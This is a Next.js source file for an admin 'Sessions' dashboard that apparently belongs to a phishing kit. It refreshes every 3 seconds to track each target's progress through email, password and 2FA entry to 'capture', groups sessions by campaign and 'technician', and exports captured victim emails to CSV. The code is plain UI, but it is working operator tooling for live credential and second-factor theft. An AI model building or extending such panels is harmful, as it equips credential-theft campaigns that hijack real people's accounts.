'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';
import { Download, Eye, Clock, Activity, Filter, ArrowLeft } from 'lucide-react';
import { formatDistanceToNow } from 'date-fns';
import { toast } from 'sonner';

interface Session {
  id: string;
  email?: string;
  technicianEmail?: string;
  target: string;
  stage: string;
  status: string;
  createdAt: string;
  updatedAt: string;
  campaign?: {
    id: string;
    name: string;
    captureId: string;
  };
  user?: {
    fullName: string;
    email: string;
  };
}

export default function SessionsPage() {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [loading, setLoading] = useState(true);
  const [filter, setFilter] = useState<'all' | 'active' | 'captured' | 'failed'>('all');
  const [lastUpdated, setLastUpdated] = useState('');

  useEffect(() => {
    fetchSessions();
    const interval = setInterval(() => {
      fetchSessions();
      updateLastUpdated();
    }, 3000);
    return () => clearInterval(interval);
  }, [filter]);

  const fetchSessions = async () => {
    try {
      let url = `${process.env.NEXT_PUBLIC_API_URL || 'https://api.fioona.org'}/api/admin/sessions`;
      if (filter !== 'all') {
        url += `?status=${filter}`;
      }
      const token = localStorage.getItem('token');
      const response = await fetch(url, {
        headers: {
          'Content-Type': 'application/json',
          ...(token ? { Authorization: `Bearer ${token}` } : {}),
        },
      });
      const data = await response.json();
      if (data.success) {
        setSessions(data.sessions || []);
      }
    } catch (error: any) {
      console.error('Failed to fetch sessions:', error);
      toast.error(error.response?.data?.error || 'Failed to load sessions');
    } finally {
      setLoading(false);
    }
  };

  const updateLastUpdated = () => {
    const now = new Date();
    const hours = now.getUTCHours().toString().padStart(2, '0');
    const minutes = now.getUTCMinutes().toString().padStart(2, '0');
    const seconds = now.getUTCSeconds().toString().padStart(2, '0');
    setLastUpdated(`${hours}:${minutes}:${seconds} UTC`);
  };

  const handleExport = () => {
    try {
      if (sessions.length === 0) {
        toast.error('No sessions to export');
        return;
      }

      // Create CSV content
      const headers = ['ID', 'Email', 'Target', 'Stage', 'Status', 'Campaign', 'Technician', 'Created At', 'Updated At'];
      const csvRows = [headers.join(',')];

      sessions.forEach(session => {
        const row = [
          session.id,
          session.email || 'N/A',
          extractDomain(session.target),
          session.stage,
          session.status,
          session.campaign?.name || 'N/A',
          session.user?.email || session.technicianEmail || 'N/A',
          new Date(session.createdAt).toISOString(),
          new Date(session.updatedAt).toISOString()
        ];
        // Escape commas and quotes in values
        const escapedRow = row.map(val => {
          const str = String(val);
          if (str.includes(',') || str.includes('"') || str.includes('\n')) {
            return `"${str.replace(/"/g, '""')}"`;
          }
          return str;
        });
        csvRows.push(escapedRow.join(','));
      });

      const csvContent = csvRows.join('\n');
      
      // Create and download file
      const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
      const link = document.createElement('a');
      const url = URL.createObjectURL(blob);
      link.setAttribute('href', url);
      link.setAttribute('download', `sessions-export-${new Date().toISOString().split('T')[0]}.csv`);
      link.style.visibility = 'hidden';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      
      toast.success(`Exported ${sessions.length} sessions to CSV`);
    } catch (error: any) {
      console.error('Failed to export sessions:', error);
      toast.error('Failed to export sessions');
    }
  };

  const getDuration = (createdAt: string) => {
    const seconds = Math.floor((new Date().getTime() - new Date(createdAt).getTime()) / 1000);
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    if (mins > 0) return `${mins}m ${secs}s`;
    return `${secs}s`;
  };

  const extractDomain = (url: string) => {
    try {
      return new URL(url).hostname;
    } catch {
      return url;
    }
  };

  const activeSessions = sessions.filter(s => s.status === 'ACTIVE' || s.status === 'active').length;
  const capturedSessions = sessions.filter(s => s.status === 'COMPLETED' || s.status === 'captured').length;
  const failedSessions = sessions.filter(s => s.status === 'FAILED' || s.status === 'failed').length;

  return (
    <div className="mx-auto max-w-7xl p-8 space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          {/* Back Link */}
          <Link href="/admin" className="flex items-center gap-1.5 text-sm text-white/60 hover:text-white transition-colors mb-3">
            <ArrowLeft className="h-3.5 w-3.5" />
            Back
          </Link>
          {/* Breadcrumb */}
          <div className="mb-2 text-sm text-white/50">
            <Link href="/admin" className="hover:text-white/70 transition-colors cursor-pointer">Admin</Link>
            <span> / </span>
            <span>Sessions</span>
          </div>
          <h1 className="text-2xl font-semibold text-white">Sessions</h1>
          <p className="text-sm text-white/50 mt-1">
            Monitor all active and historical sessions
          </p>
        </div>
        <div className="flex items-center gap-3">
          {lastUpdated && (
            <div className="flex items-center gap-2">
              <Clock className="h-4 w-4 text-white/30" />
              <span className="text-xs font-mono text-white/40">
                {lastUpdated}
              </span>
            </div>
          )}
          <button
            onClick={handleExport}
            className="flex items-center gap-2 px-4 py-2 bg-white/5 hover:bg-white/10 border border-white/10 text-white rounded-lg text-sm font-medium transition-colors"
          >
            <Download className="h-4 w-4" />
            Export
          </button>
        </div>
      </div>

      {/* Stats Row */}
      <div className="grid gap-4 md:grid-cols-4">
        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <div className="text-2xl font-semibold text-white">{sessions.length}</div>
          <div className="text-sm text-white/50 mt-1">Total Sessions</div>
        </div>
        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <div className="text-2xl font-semibold text-[#10B981]">{activeSessions}</div>
          <div className="text-sm text-white/50 mt-1">Active</div>
        </div>
        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <div className="text-2xl font-semibold text-[#4F7FFF]">{capturedSessions}</div>
          <div className="text-sm text-white/50 mt-1">Captured</div>
        </div>
        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <div className="text-2xl font-semibold text-[#EF4444]">{failedSessions}</div>
          <div className="text-sm text-white/50 mt-1">Failed</div>
        </div>
      </div>

      {/* Filter Tabs */}
      <div className="flex items-center gap-3">
        <Filter className="h-4 w-4 text-white/50" />
        <div className="flex gap-2">
          {(['all', 'active', 'captured', 'failed'] as const).map((f) => (
            <button
              key={f}
              onClick={() => setFilter(f)}
              className={`px-3 py-1.5 text-xs font-medium rounded-lg transition-colors capitalize ${
                filter === f
                  ? 'bg-[#4F7FFF]/10 text-[#4F7FFF] border border-[#4F7FFF]/20'
                  : 'bg-transparent text-white/50 hover:text-white/70'
              }`}
            >
              {f}
            </button>
          ))}
        </div>
      </div>

      {/* Sessions Table */}
      <div className="rounded-xl border border-white/10 bg-[#151823] overflow-hidden">
        {loading ? (
          <div className="p-12 flex items-center justify-center">
            <div className="h-8 w-8 border-2 border-[#4F7FFF] border-t-transparent rounded-full animate-spin"></div>
          </div>
        ) : sessions.length === 0 ? (
          <div className="p-12 text-center">
            <Eye className="h-16 w-16 mx-auto mb-4 text-white/20" />
            <h3 className="text-lg font-medium text-white mb-2">No sessions found</h3>
            <p className="text-sm text-white/50">
              Sessions will appear when technicians run campaigns
            </p>
          </div>
        ) : (
          <table className="w-full">
            <thead className="bg-white/5">
              <tr>
                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Session</th>
                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Email</th>
                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Campaign</th>
                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Technician</th>
                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Stage</th>
                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Status</th>
                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Duration</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-white/10">
              {sessions.map((session) => (
                <tr key={session.id} className="hover:bg-white/5 transition-colors">
                  <td className="px-6 py-4">
                    <div className="font-mono text-sm text-white/70">
                      {session.id.substring(0, 8)}
                    </div>
                  </td>
                  <td className="px-6 py-4">
                    <div className="text-sm text-white">
                      {session.email || 'Not captured'}
                    </div>
                  </td>
                  <td className="px-6 py-4">
                    {session.campaign ? (
                      <div>
                        <div className="text-sm text-white">{session.campaign.name}</div>
                        <div className="text-xs text-white/50 font-mono mt-0.5">{session.campaign.captureId}</div>
                      </div>
                    ) : (
                      <span className="text-sm text-white/50">Unknown</span>
                    )}
                  </td>
                  <td className="px-6 py-4">
                    {session.user ? (
                      <div>
                        <div className="text-sm text-white">{session.user.fullName}</div>
                        <div className="text-xs text-white/50">{session.user.email}</div>
                      </div>
                    ) : (
                      <span className="text-sm text-white/70">
                        {session.technicianEmail || 'Unknown'}
                      </span>
                    )}
                  </td>
                  <td className="px-6 py-4">
                    {session.stage === 'INITIATED' || session.stage === 'EMAIL_ENTERED' || session.stage === 'email' ? (
                      <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-[#4F7FFF]/10 text-[#4F7FFF] text-xs font-medium">
                        Email
                      </span>
                    ) : session.stage === 'PASSWORD_ENTERED' || session.stage === 'password' ? (
                      <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-[#F59E0B]/10 text-[#F59E0B] text-xs font-medium">
                        Password
                      </span>
                    ) : session.stage === '2FA_REQUIRED' || session.stage === '2fa' ? (
                      <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-[#8B5CF6]/10 text-[#8B5CF6] text-xs font-medium">
                        2FA
                      </span>
                    ) : session.stage === 'COMPLETED' || session.stage === 'captured' ? (
                      <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-[#10B981]/10 text-[#10B981] text-xs font-medium">
                        Captured
                      </span>
                    ) : (
                      <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-white/10 text-white/50 text-xs font-medium">
                        {session.stage}
                      </span>
                    )}
                  </td>
                  <td className="px-6 py-4">
                    {session.status === 'ACTIVE' || session.status === 'active' ? (
                      <div className="flex items-center gap-2">
                        <div className="w-2 h-2 rounded-full bg-[#10B981] animate-pulse"></div>
                        <span className="text-xs text-[#10B981] font-medium">Live</span>
                      </div>
                    ) : session.status === 'COMPLETED' || session.status === 'captured' ? (
                      <div className="flex items-center gap-2">
                        <div className="w-2 h-2 rounded-full bg-[#4F7FFF]"></div>
                        <span className="text-xs text-[#4F7FFF] font-medium">Captured</span>
                      </div>
                    ) : session.status === 'FAILED' || session.status === 'failed' ? (
                      <div className="flex items-center gap-2">
                        <div className="w-2 h-2 rounded-full bg-[#EF4444]"></div>
                        <span className="text-xs text-[#EF4444] font-medium">Failed</span>
                      </div>
                    ) : (
                      <div className="flex items-center gap-2">
                        <div className="w-2 h-2 rounded-full bg-white/50"></div>
                        <span className="text-xs text-white/50 font-medium">{session.status}</span>
                      </div>
                    )}
                  </td>
                  <td className="px-6 py-4">
                    <div className="flex items-center gap-2">
                      <Clock className="h-3.5 w-3.5 text-white/40" />
                      <span className="text-sm font-mono text-white/60">
                        {getDuration(session.createdAt)}
                      </span>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </div>

      {/* Info Card */}
      <div className="rounded-xl border border-[#10B981]/20 bg-[#10B981]/10 p-4">
        <div className="flex gap-3">
          <Activity className="h-5 w-5 text-[#10B981] flex-shrink-0 mt-0.5" />
          <div className="text-sm text-white/70 space-y-1">
            <p className="font-medium text-white">Live Session Monitoring</p>
            <p className="text-white/60">
              This table auto-refreshes every 3 seconds. Active sessions show real-time progress through email → password → 2FA → capture stages.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
